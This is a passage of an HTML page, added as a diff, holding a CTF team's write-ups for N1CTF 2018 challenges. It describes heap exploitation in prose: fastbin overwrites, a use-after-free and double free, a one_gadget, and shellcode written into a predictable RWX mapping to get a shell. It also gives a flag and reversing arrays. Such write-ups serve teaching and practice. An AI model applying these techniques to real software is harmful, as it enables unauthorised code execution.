@@ -1,0 +1,741 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>N1CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#null-(kevin47)">null-(kevin47)</a>
+    
+                <a class="dropdown-item" href="#memsafety-(kevin47)">memsafety-(kevin47)</a>
+    
+                <a class="dropdown-item" href="#beeper(4w4rd)">beeper(4w4rd)</a>
+    
+                <a class="dropdown-item" href="#vote-(how2hack)">vote-(how2hack)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#patience-(sces60107)">patience-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#baby-neural-network-(sasdf)">baby-neural-network-(sasdf)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#77777-(sasdf,-bookgin)">77777-(sasdf,-bookgin)</a>
+    
+                <a class="dropdown-item" href="#77777-2-(bookgin)-unsolved">77777-2-(bookgin)-unsolved</a>
+    
+                <a class="dropdown-item" href="#babysqli-(bookgin)-unsolved">babysqli-(bookgin)-unsolved</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#baby_n1es-(shw)">baby_n1es-(shw)</a>
+    
+                <a class="dropdown-item" href="#rsa_padding-(shw)">rsa_padding-(shw)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                ppc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#losetome-(how2hack)">losetome-(how2hack)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#null-(kevin47)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">null-(kevin47)</span>
+            </a>
+    
+<a href="#memsafety-(kevin47)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">memsafety-(kevin47)</span>
+            </a>
+    
+<a href="#beeper(4w4rd)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">beeper(4w4rd)</span>
+            </a>
+    
+<a href="#vote-(how2hack)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">vote-(how2hack)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#patience-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">patience-(sces60107)</span>
+            </a>
+    
+<a href="#baby-neural-network-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-neural-network-(sasdf)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#77777-(sasdf,-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">77777-(sasdf,-bookgin)</span>
+            </a>
+    
+<a href="#77777-2-(bookgin)-unsolved" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">77777-2-(bookgin)-unsolved</span>
+            </a>
+    
+<a href="#babysqli-(bookgin)-unsolved" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babysqli-(bookgin)-unsolved</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#baby_n1es-(shw)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby_n1es-(shw)</span>
+            </a>
+    
+<a href="#rsa_padding-(shw)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rsa_padding-(shw)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">ppc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#losetome-(how2hack)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">losetome-(how2hack)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu5" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu5" class="collapse sidebar-submenu">
+            
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="n1ctf-2018"><a class="header-link" href="#n1ctf-2018"></a>N1CTF 2018</h1>
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="null-(kevin47)"><a class="header-link" href="#null-(kevin47)"></a>null (kevin47)</h3>
+<blockquote>
+<p>ELF 64-bit, stripped, Canary and NX enabled, Full RELRO, No PIE
+結果這題根本超簡單QQ</p>
+<ul class="list">
+<li>arbitrary malloc with no free</li>
+<li>overflow in read</li>
+<li>using thread</li>
+<li>function pointer in 0x602038</li>
+</ul>
+</blockquote>
+<p>After the first malloc, the mapped address space will look like:</p>
+<pre class="hljs"><code>    Start Addr         End Addr       Size  Offset 
+...
+     <span class="hljs-number">0x20c6000</span>        <span class="hljs-number">0x20e7000</span>    <span class="hljs-number">0x21000</span>  <span class="hljs-number">0x0</span> [heap]
+<span class="hljs-number">0x7f7b60000000</span>   <span class="hljs-number">0x7f7b60021000</span>    <span class="hljs-number">0x21000</span>  <span class="hljs-number">0x0</span> &lt;- thread arena
+<span class="hljs-number">0x7f7b60021000</span>   <span class="hljs-number">0x7f7b64000000</span>  <span class="hljs-number">0x3fdf000</span>  <span class="hljs-number">0x0</span> &lt;- space for malloc
+<span class="hljs-number">0x7f7b6714c000</span>   <span class="hljs-number">0x7f7b6714d000</span>     <span class="hljs-number">0x1000</span>  <span class="hljs-number">0x0</span> 
+<span class="hljs-number">0x7f7b6714d000</span>   <span class="hljs-number">0x7f7b6794d000</span>   <span class="hljs-number">0x800000</span>  <span class="hljs-number">0x0</span> 
+<span class="hljs-number">0x7f7b6794d000</span>   <span class="hljs-number">0x7f7b67b0d000</span>   <span class="hljs-number">0x1c0000</span>  <span class="hljs-number">0x0</span> /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so
+...
+</code></pre><p>Our goal is to overwrite thread arena with overflow, so we need a chunk of memory before the thread arena. Achive this by spamming malloc. After filling the space, new mapped address space will look like:</p>
+<pre class="hljs"><code>    Start Addr         End Addr       Size  Offset 
+...
+     <span class="hljs-number">0x20c6000</span>        <span class="hljs-number">0x20e7000</span>    <span class="hljs-number">0x21000</span>  <span class="hljs-number">0x0</span> [heap]
+<span class="hljs-number">0x7f7b58000000</span>   <span class="hljs-number">0x7f7b60000000</span>  <span class="hljs-number">0x8000000</span>  <span class="hljs-number">0x0</span> &lt;- new mapped space
+<span class="hljs-number">0x7f7b60000000</span>   <span class="hljs-number">0x7f7b63ffd000</span>  <span class="hljs-number">0x3ffd000</span>  <span class="hljs-number">0x0</span> &lt;- thread arena
+<span class="hljs-number">0x7f7b63ffd000</span>   <span class="hljs-number">0x7f7b64000000</span>     <span class="hljs-number">0x3000</span>  <span class="hljs-number">0x0</span> &lt;- filled space
+<span class="hljs-number">0x7f7b6714c000</span>   <span class="hljs-number">0x7f7b6714d000</span>     <span class="hljs-number">0x1000</span>  <span class="hljs-number">0x0</span> 
+<span class="hljs-number">0x7f7b6714d000</span>   <span class="hljs-number">0x7f7b6794d000</span>   <span class="hljs-number">0x800000</span>  <span class="hljs-number">0x0</span> 
+<span class="hljs-number">0x7f7b6794d000</span>   <span class="hljs-number">0x7f7b67b0d000</span>   <span class="hljs-number">0x1c0000</span>  <span class="hljs-number">0x0</span> /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so
+...</code></pre><p>Bang! the new space will be before the thread arena! Just fill it again so that we can control the end near 0x7f7b60000000.</p>
+<p>Thread arenas&#39; structure are similar (may be equal) to the main arena, they both has fastbins.</p>
+<p>We overwrite the fastbin of size 0x70 to 0x60201d, just before the function pointer. Overwrite the pointer to system@PLT and get shell :)</p>
+<h3 id="memsafety-(kevin47)"><a class="header-link" href="#memsafety-(kevin47)"></a>memsafety (kevin47)</h3>
+<blockquote>
+<p>ELF 64-bit, stripped, no canary found, NX and PIE enabled, partial RELRO
+Rust 題，source code 1000 行，我不一定看得完 (￣▽￣)</p>
+<ul class="list">
+<li>Rust checks array boundary in runtime, so it needs no canary</li>
+</ul>
+</blockquote>
+<h3 id="beeper(4w4rd)"><a class="header-link" href="#beeper(4w4rd)"></a>beeper(4w4rD)</h3>
+<blockquote>
+<p>ELF 64-bit, stripped, canary NX PIE enabled, partial RELRO
+brain fuck</p>
+<ul class="list">
+<li>predictable mmap address:
+  The process would mmap an readable, writeable, executeable space. The address is create by rand() with srand(time(0)), so it is predictable.We can write shellcode on it, and there is a function pointer that already point to it.</li>
+<li>brain-fuck  like interpreter:
+  There is an interpreter that can interpret a language similar as brain fuck, and it always take the command on the .data section</li>
+<li>password:
+  Password is constant and can be known by reversing, but before checking the input password the interpret would execute and change the input passwrd.</li>
+<li>BOF:
+  The input password can be overflowed, and we can change the command that the interpreter execute. We can overwrite command with NULL, so the interpret will not do anything.</li>
+<li>write shellcode:
+  Login again, and we can use brain-fuck like language to write shell code on mmap address.Then we can trigger fuction pointer to get shell.</li>
+</ul>
+</blockquote>
+<h3 id="vote-(how2hack)"><a class="header-link" href="#vote-(how2hack)"></a>vote (how2hack)</h3>
+<blockquote>
+<p>ELF 64-bit, stripped, Canary and NX enabled, partial RELRO</p>
+<ul class="list">
+<li>Data structure:<ul class="list">
+<li>Number of votes (8 bytes, uncontrollable)</li>
+<li>Last voting time (8 bytes, uncontrollable)</li>
+<li>Name (malloc size, controllable)</li>
+</ul>
+</li>
+<li>Binary with 5 functions:<ul class="list">
+<li>Create: malloc size 1~4096, then input data</li>
+<li>Show: show the data infos (votes, time, name)</li>
+<li>Vote: Not important</li>
+<li>Result: Not important</li>
+<li>Cancel: free a chunk</li>
+</ul>
+</li>
+<li>Vulnerabilities:<ul class="list">
+<li>Use-after-free:<ul class="list">
+<li>Freed chunk doesn&#39;t set to NULL</li>
+<li>Use show() to leak FD and BK (libc address)</li>
+</ul>
+</li>
+<li>Double Free:<ul class="list">
+<li>Fastbin corruption attack</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Exploit:<ul class="list">
+<li>Forging fake fastbin (Q is UAF) :
+  <img src="https://imgur.com/u49MzKQ.jpg" alt="vote1"></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<pre class="hljs"><code>    ![vote2](http<span class="hljs-variable">s:</span>//imgur.<span class="hljs-keyword">com</span>/Gyjma2C.jpg)
+
+    ![vote3](http<span class="hljs-variable">s:</span>//imgur.<span class="hljs-keyword">com</span>/PXc4KZy.jpg)
+
+    ![vote4](http<span class="hljs-variable">s:</span>//imgur.<span class="hljs-keyword">com</span>/R5l6TlY.jpg)
+
+    ![vote5](http<span class="hljs-variable">s:</span>//imgur.<span class="hljs-keyword">com</span>/Ne0nVvx.jpg)
+
+* Overwrite pthread_create <span class="hljs-keyword">to</span> one_gadget <span class="hljs-built_in">and</span> <span class="hljs-built_in">get</span> shell!</code></pre><ul class="list">
+<li>Flag:<ul class="list">
+<li><code>N1CTF{Pr1nTf_2333333333!}</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<h3 id="patience-(sces60107)"><a class="header-link" href="#patience-(sces60107)"></a>patience (sces60107)</h3>
+<p>In this challenge, we will be given one binary and one cmm file.</p>
+<p>The binary will print flag very slowly. So we must figure out the algorithm in this binary.</p>
+<p>But IDA pro is not working on this binary. </p>
+<p>After some googling I found that cmm file is related to <a href="">haskell compiler</a></p>
+<p>Fortunately, the cmm file is somehow human-readable.</p>
+<p>With some guessing I summerize some pseudo classes.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s0</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span>  [<span class="hljs-number">97</span>,<span class="hljs-number">98</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">102</span>,<span class="hljs-number">103</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">106</span>,<span class="hljs-number">107</span>,<span class="hljs-number">108</span>,<span class="hljs-number">109</span>,<span class="hljs-number">110</span>,<span class="hljs-number">111</span>,<span class="hljs-number">112</span>,<span class="hljs-number">113</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">120</span>,<span class="hljs-number">121</span>,<span class="hljs-number">122</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">67</span>,<span class="hljs-number">68</span>,<span class="hljs-number">69</span>,<span class="hljs-number">70</span>,<span class="hljs-number">71</span>,<span class="hljs-number">72</span>,<span class="hljs-number">73</span>,<span class="hljs-number">74</span>,<span class="hljs-number">75</span>,<span class="hljs-number">76</span>,<span class="hljs-number">77</span>,<span class="hljs-number">78</span>,<span class="hljs-number">79</span>,<span class="hljs-number">80</span>,<span class="hljs-number">81</span>,<span class="hljs-number">82</span>,<span class="hljs-number">83</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">86</span>,<span class="hljs-number">87</span>,<span class="hljs-number">88</span>,<span class="hljs-number">89</span>,<span class="hljs-number">90</span>,<span class="hljs-number">48</span>,<span class="hljs-number">49</span>,<span class="hljs-number">50</span>,<span class="hljs-number">51</span>,<span class="hljs-number">52</span>,<span class="hljs-number">53</span>,<span class="hljs-number">54</span>,<span class="hljs-number">55</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">33</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">37</span>,<span class="hljs-number">38</span>,<span class="hljs-number">39</span>,<span class="hljs-number">34</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>,<span class="hljs-number">42</span>,<span class="hljs-number">43</span>,<span class="hljs-number">44</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,<span class="hljs-number">47</span>,<span class="hljs-number">58</span>,<span class="hljs-number">59</span>,<span class="hljs-number">60</span>,<span class="hljs-number">61</span>,<span class="hljs-number">62</span>,<span class="hljs-number">63</span>,<span class="hljs-number">64</span>,<span class="hljs-number">91</span>,<span class="hljs-number">92</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">95</span>,<span class="hljs-number">96</span>,<span class="hljs-number">123</span>,<span class="hljs-number">124</span>,<span class="hljs-number">125</span>,<span class="hljs-number">126</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> [<span class="hljs-number">49</span>,<span class="hljs-number">118</span>,<span class="hljs-number">73</span>,<span class="hljs-number">123</span>,<span class="hljs-number">101</span>,<span class="hljs-number">91</span>,<span class="hljs-number">56</span>,<span class="hljs-number">84</span>,<span class="hljs-number">100</span>,<span class="hljs-number">93</span>,<span class="hljs-number">45</span>,<span class="hljs-number">110</span>,<span class="hljs-number">81</span>,<span class="hljs-number">46</span>,<span class="hljs-number">55</span>,<span class="hljs-number">79</span>,<span class="hljs-number">34</span>,<span class="hljs-number">98</span>,<span class="hljs-number">108</span>,<span class="hljs-number">40</span>,<span class="hljs-number">106</span>,<span class="hljs-number">113</span>,<span class="hljs-number">64</span>,<span class="hljs-number">60</span>,<span class="hljs-number">48</span>,<span class="hljs-number">86</span>,<span class="hljs-number">121</span>,<span class="hljs-number">38</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">126</span>,<span class="hljs-number">92</span>,<span class="hljs-number">112</span>,<span class="hljs-number">115</span>,<span class="hljs-number">44</span>,<span class="hljs-number">97</span>,<span class="hljs-number">68</span>,<span class="hljs-number">94</span>,<span class="hljs-number">59</span>,<span class="hljs-number">66</span>,<span class="hljs-number">78</span>,<span class="hljs-number">57</span>,<span class="hljs-number">74</span>,<span class="hljs-number">85</span>,<span class="hljs-number">111</span>,<span class="hljs-number">104</span>,<span class="hljs-number">124</span>,<span class="hljs-number">67</span>,<span class="hljs-number">69</span>,<span class="hljs-number">50</span>,<span class="hljs-number">95</span>,<span class="hljs-number">54</span>,<span class="hljs-number">33</span>,<span class="hljs-number">71</span>,<span class="hljs-number">39</span>,<span class="hljs-number">114</span>,<span class="hljs-number">72</span>,<span class="hljs-number">117</span>,<span class="hljs-number">102</span>,<span class="hljs-number">62</span>,<span class="hljs-number">36</span>,<span class="hljs-number">83</span>,<span class="hljs-number">37</span>,<span class="hljs-number">77</span>,<span class="hljs-number">120</span>,<span class="hljs-number">103</span>,<span class="hljs-number">122</span>,<span class="hljs-number">75</span>,<span class="hljs-number">89</span>,<span class="hljs-number">52</span>,<span class="hljs-number">96</span>,<span class="hljs-number">99</span>,<span class="hljs-number">43</span>,<span class="hljs-number">87</span>,<span class="hljs-number">88</span>,<span class="hljs-number">65</span>,<span class="hljs-number">53</span>,<span class="hljs-number">70</span>,<span class="hljs-number">41</span>,<span class="hljs-number">109</span>,<span class="hljs-number">82</span>,<span class="hljs-number">125</span>,<span class="hljs-number">35</span>,<span class="hljs-number">80</span>,<span class="hljs-number">116</span>,<span class="hljs-number">76</span>,<span class="hljs-number">63</span>,<span class="hljs-number">42</span>,<span class="hljs-number">61</span>,<span class="hljs-number">105</span>,<span class="hljs-number">47</span>,<span class="hljs-number">58</span>,<span class="hljs-number">119</span>,<span class="hljs-number">107</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s2</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> [<span class="hljs-number">66</span>,<span class="hljs-number">112</span>,<span class="hljs-number">125</span>,<span class="hljs-number">105</span>,<span class="hljs-number">123</span>,<span class="hljs-number">88</span>,<span class="hljs-number">85</span>,<span class="hljs-number">37</span>,<span class="hljs-number">102</span>,<span class="hljs-number">36</span>,<span class="hljs-number">68</span>,<span class="hljs-number">82</span>,<span class="hljs-number">92</span>,<span class="hljs-number">48</span>,<span class="hljs-number">60</span>,<span class="hljs-number">76</span>,<span class="hljs-number">120</span>,<span class="hljs-number">61</span>,<span class="hljs-number">111</span>,<span class="hljs-number">34</span>,<span class="hljs-number">83</span>,<span class="hljs-number">108</span>,<span class="hljs-number">96</span>,<span class="hljs-number">98</span>,<span class="hljs-number">122</span>,<span class="hljs-number">41</span>,<span class="hljs-number">45</span>,<span class="hljs-number">101</span>,<span class="hljs-number">54</span>,<span class="hljs-number">50</span>,<span class="hljs-number">124</span>,<span class="hljs-number">38</span>,<span class="hljs-number">74</span>,<span class="hljs-number">113</span>,<span class="hljs-number">70</span>,<span class="hljs-number">84</span>,<span class="hljs-number">33</span>,<span class="hljs-number">40</span>,<span class="hljs-number">67</span>,<span class="hljs-number">53</span>,<span class="hljs-number">121</span>,<span class="hljs-number">104</span>,<span class="hljs-number">59</span>,<span class="hljs-number">64</span>,<span class="hljs-number">117</span>,<span class="hljs-number">42</span>,<span class="hljs-number">46</span>,<span class="hljs-number">87</span>,<span class="hljs-number">97</span>,<span class="hljs-number">90</span>,<span class="hljs-number">35</span>,<span class="hljs-number">81</span>,<span class="hljs-number">118</span>,<span class="hljs-number">44</span>,<span class="hljs-number">63</span>,<span class="hljs-number">99</span>,<span class="hljs-number">114</span>,<span class="hljs-number">56</span>,<span class="hljs-number">119</span>,<span class="hljs-number">69</span>,<span class="hljs-number">109</span>,<span class="hljs-number">52</span>,<span class="hljs-number">95</span>,<span class="hljs-number">116</span>,<span class="hljs-number">49</span>,<span class="hljs-number">57</span>,<span class="hljs-number">80</span>,<span class="hljs-number">72</span>,<span class="hljs-number">58</span>,<span class="hljs-number">106</span>,<span class="hljs-number">93</span>,<span class="hljs-number">62</span>,<span class="hljs-number">91</span>,<span class="hljs-number">78</span>,<span class="hljs-number">86</span>,<span class="hljs-number">77</span>,<span class="hljs-number">110</span>,<span class="hljs-number">55</span>,<span class="hljs-number">89</span>,<span class="hljs-number">71</span>,<span class="hljs-number">107</span>,<span class="hljs-number">75</span>,<span class="hljs-number">39</span>,<span class="hljs-number">94</span>,<span class="hljs-number">47</span>,<span class="hljs-number">126</span>,<span class="hljs-number">79</span>,<span class="hljs-number">73</span>,<span class="hljs-number">100</span>,<span class="hljs-number">115</span>,<span class="hljs-number">65</span>,<span class="hljs-number">43</span>,<span class="hljs-number">51</span>,<span class="hljs-number">103</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s3</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> [<span class="hljs-number">95</span>,<span class="hljs-number">114</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">121</span>,<span class="hljs-number">104</span>,<span class="hljs-number">91</span>,<span class="hljs-number">89</span>,<span class="hljs-number">41</span>,<span class="hljs-number">83</span>,<span class="hljs-number">56</span>,<span class="hljs-number">97</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">119</span>,<span class="hljs-number">86</span>,<span class="hljs-number">38</span>,<span class="hljs-number">106</span>,<span class="hljs-number">118</span>,<span class="hljs-number">34</span>,<span class="hljs-number">111</span>,<span class="hljs-number">61</span>,<span class="hljs-number">73</span>,<span class="hljs-number">40</span>,<span class="hljs-number">54</span>,<span class="hljs-number">62</span>,<span class="hljs-number">112</span>,<span class="hljs-number">103</span>,<span class="hljs-number">44</span>,<span class="hljs-number">102</span>,<span class="hljs-number">45</span>,<span class="hljs-number">77</span>,<span class="hljs-number">93</span>,<span class="hljs-number">113</span>,<span class="hljs-number">98</span>,<span class="hljs-number">78</span>,<span 